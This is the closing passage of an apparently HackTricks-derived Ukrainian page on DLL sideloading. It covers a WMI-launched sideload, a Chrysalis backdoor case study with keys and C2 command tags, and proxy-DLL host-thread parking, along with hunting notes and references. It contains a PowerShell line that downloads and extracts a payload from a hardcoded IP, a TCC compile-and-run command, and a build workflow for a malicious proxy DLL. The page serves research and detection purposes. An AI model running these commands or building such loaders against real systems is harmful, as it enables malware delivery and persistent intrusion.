$base = "$Env:LocalAppData"; $dir = Join-Path $base (Get-Random); curl -s -L -o "$dir.pdf" 79.141.172.212/tcp; mkdir "$dir"; tar -xf "$dir.pdf" -C "$dir"; $exe = "$dir\intelbq.exe"
```
- `curl -s -L` приховує progress і слідує redirects; `tar -xf` використовує вбудований у Windows tar.

- **WMI/CIM launch:** Запустіть EXE через WMI, щоб telemetry показувала process, створений CIM, поки він завантажує colocated DLL:

```powershell
Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = "`"$exe`""}
```
- Працює з binaries, які віддають перевагу local DLLs (наприклад, `intelbq.exe`, `nearby_share.exe`); payload (наприклад, Remcos) працює під trusted name.

- **Hunting:** Спрацьовуйте на `forfiles`, коли `/p`, `/m` і `/c` з’являються разом; це нетипово поза admin scripts.


## Case Study: NSIS dropper + Bitdefender Submission Wizard sideload (Chrysalis)

Нещодавнє вторгнення Lotus Blossom зловживало trusted update chain, щоб доставити NSIS-packed dropper, який підготував DLL sideload і повністю in-memory payloads.

Tradecraft flow
- `update.exe` (NSIS) створює `%AppData%\Bluetooth`, позначає його як **HIDDEN**, скидає перейменований Bitdefender Submission Wizard `BluetoothService.exe`, malicious `log.dll` і encrypted blob `BluetoothService`, а потім запускає EXE.
- Host EXE імпортує `log.dll` і викликає `LogInit`/`LogWrite`. `LogInit` mmap-loads blob; `LogWrite` decrypt-ить його за допомогою custom LCG-based stream (constants **0x19660D** / **0x3C6EF35F**, key material, derived from a prior hash), перезаписує buffer plaintext shellcode, звільняє temps і переходить до нього.
- Щоб уникнути IAT, loader знаходить APIs за hash-ами export names, використовуючи **FNV-1a basis 0x811C9DC5 + prime 0x1000193**, а потім застосовує Murmur-style avalanche (**0x85EBCA6B**) і порівнює з salted target hashes.

Main shellcode (Chrysalis)
- Decrypt-ить PE-like main module, повторюючи add/XOR/sub з key `gQ2JR&9;` у п’ять проходів, а потім dynamically loads `Kernel32.dll` → `GetProcAddress`, щоб завершити import resolution.
- Відновлює DLL name strings під час runtime через per-character bit-rotate/XOR transforms, потім завантажує `oleaut32`, `advapi32`, `shlwapi`, `user32`, `wininet`, `ole32`, `shell32`.
- Використовує другий resolver, який проходить **PEB → InMemoryOrderModuleList**, розбирає кожну export table блоками по 4 байти з Murmur-style mixing і лише потім повертається до `GetProcAddress`, якщо hash не знайдено.

Embedded configuration & C2
- Config зберігається всередині скинутого файла `BluetoothService` за адресою **offset 0x30808** (size **0x980**) і RC4-decrypted з key `qwhvb^435h&*7`, розкриваючи C2 URL і User-Agent.
- Beacons build-ять host profile, розділений крапками, додають tag `4Q`, потім RC4-encrypt із key `vAuig34%^325hGV` перед `HttpSendRequestA` over HTTPS. Responses RC4-decrypt-яться і dispatch-аться через tag switch (`4T` shell, `4V` process exec, `4W/4X` file write, `4Y` read/exfil, `4\\` uninstall, `4` drive/file enum + chunked transfer cases).
- Execution mode керується CLI args: no args = install persistence (service/Run key), що вказує на `-i`; `-i` relaunches self з `-k`; `-k` пропускає install і запускає payload.

Alternate loader observed
- Та саме вторгнення скинуло Tiny C Compiler і виконувало `svchost.exe -nostdlib -run conf.c` з `C:\ProgramData\USOShared\`, а `libtcc.dll` лежав поруч. C source, наданий attackers, містив shellcode, компілювався і запускався in-memory без запису PE на диск. Відтворіть за допомогою:
```cmd
C:\ProgramData\USOShared\tcc.exe -nostdlib -run conf.c
```
- Цей TCC-based compile-and-run етап імпортував `Wininet.dll` під час виконання і завантажував second-stage shellcode з hardcoded URL, створюючи flexible loader, що маскувався під запуск compiler.

## Signed-host sideloading with export proxying + host thread parking

Деякі DLL sideloading chains додають **stability engineering**, щоб legitimate host залишався активним достатньо довго для коректного завантаження пізніших stage, замість падіння після завантаження malicious DLL.

Observed pattern
- Drop trusted EXE поруч із malicious DLL, використовуючи очікувану назву dependency, таку як `version.dll`.
- Malicious DLL **proxies every expected export** назад до real system DLL (наприклад `%SystemRoot%\\System32\\version.dll`), щоб import resolution і далі успішно працював, а host process залишався функціональним.
- Після load malicious DLL **patches the host entry point** так, щоб main thread переходив в infinite `Sleep` loop замість завершення або виконання code paths, які б terminate process.
- Новий thread виконує реальну malicious work: decrypting the next-stage DLL name або path (RC4/XOR є common), а потім запускає його через `LoadLibrary`.

Why this matters
- Normal DLL proxying зберігає API compatibility, але не гарантує, що host залишиться alive достатньо довго для later stages.
- Parking main thread у `Sleep(INFINITE)` — простий спосіб утримувати signed process resident, поки loader виконує decryption, staging або network bootstrap у worker thread.
- Hunting лише за suspicious `DllMain` пропустить цей pattern, якщо interesting behavior відбувається вже після того, як host entry point patched і запускається secondary thread.

Minimal workflow
1. Copy signed host EXE і визначте DLL, яку він резолвить із local directory.
2. Build proxy DLL, що export'ить ті самі functions і forward'ить їх до legitimate DLL.
3. У `DllMain(DLL_PROCESS_ATTACH)` створіть worker thread.
4. З цього thread patch'ніть host entry point або main thread start routine так, щоб він loop'ив на `Sleep`.
5. Decrypt next-stage DLL name/config і викличте `LoadLibrary` або manual-map payload.

Defensive pivots
- Signed processes, що завантажують `version.dll` або подібні common libraries зі своєї application directory замість `System32`.
- Memory patches в process entry point незабаром після image load, особливо jumps/calls, перенаправлені на `Sleep`/`SleepEx`.
- Threads, створені proxy DLL, які одразу викликають `LoadLibrary` для second DLL із decrypted name.
- Full-export proxy DLL, розміщені поруч із vendor executables у writable staging directories, таких як `ProgramData`, `%TEMP%`, або unpacked archive paths.

## References

- [Red Canary – Intelligence Insights: January 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-january-2026/)
- [CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe](https://trustedsec.com/blog/cve-2025-1729-privilege-escalation-using-tpqmassistant-exe)
- [Microsoft Store - TPQM Assistant UWP](https://apps.microsoft.com/detail/9mz08jf4t3ng)
- [https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
- [https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)
- [Check Point Research – Nimbus Manticore Deploys New Malware Targeting Europe](https://research.checkpoint.com/2025/nimbus-manticore-deploys-new-malware-targeting-europe/)
- [TrustedSec – Hack-cessibility: When DLL Hijacks Meet Windows Helpers](https://trustedsec.com/blog/hack-cessibility-when-dll-hijacks-meet-windows-helpers)
- [PoC – api0cradle/Narrator-dll](https://github.com/api0cradle/Narrator-dll)
- [Sysinternals Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [Unit 42 – Digital Doppelgangers: Anatomy of Evolving Impersonation Campaigns Distributing Gh0st RAT](https://unit42.paloaltonetworks.com/impersonation-campaigns-deliver-gh0st-rat/)
- [Unit 42 – Converging Interests: Analysis of Threat Clusters Targeting a Southeast Asian Government](https://unit42.paloaltonetworks.com/espionage-campaigns-target-se-asian-government-org/)
- [Check Point Research – Inside Ink Dragon: Revealing the Relay Network and Inner Workings of a Stealthy Offensive Operation](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [Rapid7 – The Chrysalis Backdoor: A Deep Dive into Lotus Blossom’s toolkit](https://www.rapid7.com/blog/post/tr-chrysalis-backdoor-dive-into-lotus-blossoms-toolkit)
- [0xdf – HTB Bruno ZipSlip → DLL hijack chain](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)
- [Check Point Research – Fast and Furious: Nimbus Manticore Operations During the Iranian Conflict](https://research.checkpoint.com/2026/fast-and-furious-nimbus-manticore-operations-during-the-iranian-conflict/)
- [Microsoft Learn – `<appDomainManagerType>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/appdomainmanagertype-element)
- [Microsoft Learn – `<appDomainManagerAssembly>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/appdomainmanagerassembly-element)
- [Microsoft Learn – Task Actions](https://learn.microsoft.com/en-us/windows/win32/taskschd/task-actions)


{{#include ../../../banners/hacktricks-training.md}}
